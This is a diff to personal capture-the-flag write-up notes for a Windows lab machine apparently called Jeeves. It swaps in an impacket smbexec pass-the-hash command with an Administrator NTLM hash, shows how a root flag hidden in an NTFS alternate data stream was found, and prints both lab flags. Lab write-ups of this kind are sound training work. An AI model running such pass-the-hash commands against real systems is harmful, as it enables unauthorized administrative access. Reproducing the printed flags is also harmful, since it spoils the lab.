@@ -12,7 +12,7 @@
 **Time :** 
 	**Start :** 22.04.2025 16:31
 	**Break at/to :** 22.04.2025 19:02 | 23.04.2025 17:00
-	**Finish :** 
+	**Finish :** 23.04.2025 18:08
 **Satisfaction :**  
 ### 1. **Reconnaissance
 
@@ -160,8 +160,7 @@ keepassxc open file.kdbx
 Now we can correctly connect to the machin as Administrator with : 
 
 ```BASH
-pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb
-e81fe00 //10.129.228.112 cmd
+python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.129.228.112
 ```
 
 ## 5. **Installation
@@ -175,4 +174,67 @@ So for the first flag it's in kohsuke on his desktop :
 ```POWERSHELL
 > type kohsuke\Desktop\user.txt
 e3232272596fb47950d59c4cf1e7066a
+```
+
+
+Now for the root flag :
+
+```POWERSHELL
+C:\Windows\system32>type C:\Users\Administrator\Desktop\hm.txt
+The flag is elsewhere.  Look deeper.
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\"Windows 10 Update Assistant".lnk
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute smbexec.py again with -codec and the corresponding codec
+L�F� �<VU��<VU��E���ȚP�O� �:i�+00�/C:\j1eKw4WINDOW~1R	�dK8eKw4.�q�&Windows10Upgrade~2Ț�JOo WINDOW~1.EXEb	�dK9dK9.��Windows10UpgraderApp.exe[-ZɱP�C:\Windows10Upgrade\Windows10UpgraderApp.exe2..\..\..\Windows10Upgrade\Windows10UpgraderApp.exe&/ClientID "Win10Upgrade:VNL:Th2Eos:{}"`�XjeevesĘ�R+�$H�||�� �
+                                                                     U�������
+                                                                             )E�.Ę�R+�$H�||�� �
+                                                                                               U�������
+                                                                                                       )E�.E	�91SPS�mD��pH�H@.�=x�hH�R;W�0@��U@�S|�
+```
+
+We are going to look deeper.
+
+```POWERSHELL
+C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,680,635,392 bytes free
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\hm.txt:root.txt
+The filename, directory name, or volume label syntax is incorrect.
+
+C:\Windows\system32>more < C:\Users\Administrator\Desktop\hm.txt:root.txt
+[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-yfwujbxq4p]─[~/Desktop/netcat-1.11/impacket]
+└──╼ [★]$ python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.129.8.255
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,680,582,144 bytes free
+
+C:\Windows\system32>powershell -command "Get-Content -path 'C:\Users\Administrator\Desktop\hm.txt:root.txt'"
+afbc5bd4b615a60648cec41c6ac92530
 ```
